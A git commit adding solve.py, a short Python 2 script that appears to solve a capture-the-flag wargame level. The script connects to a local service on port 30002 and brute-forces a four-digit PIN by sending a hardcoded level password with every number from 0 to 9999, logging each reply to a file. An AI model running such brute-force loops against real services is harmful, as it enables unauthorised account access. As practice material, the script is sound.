6c09c1ddce8cb83806e6ca98be4e8e4d9b2c36b4
Hisham Alshaikh <30352665+h15h4m@users.noreply.github.com>
2017-07-22 19:54:08 +0300

    Create solve.py

---
+++ solve.py
@@ -0,0 +1,30 @@
+#!/usr/bin/python
+# h15h4m
+
+import socket
+
+
+current_pass =  "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ";
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+
+s.connect( ("localhost", 30002 ));
+
+print s.recv(1024)
+
+
+
+f = open("result", 'w')
+
+
+i = 0
+
+while i < 10000:
+    s.send(current_pass + " " + str( i)  +"\r\n")
+    f.write(s.recv(1024) + '\n')
+    i = i + 1 
+
+s.close()
+f.close()
+
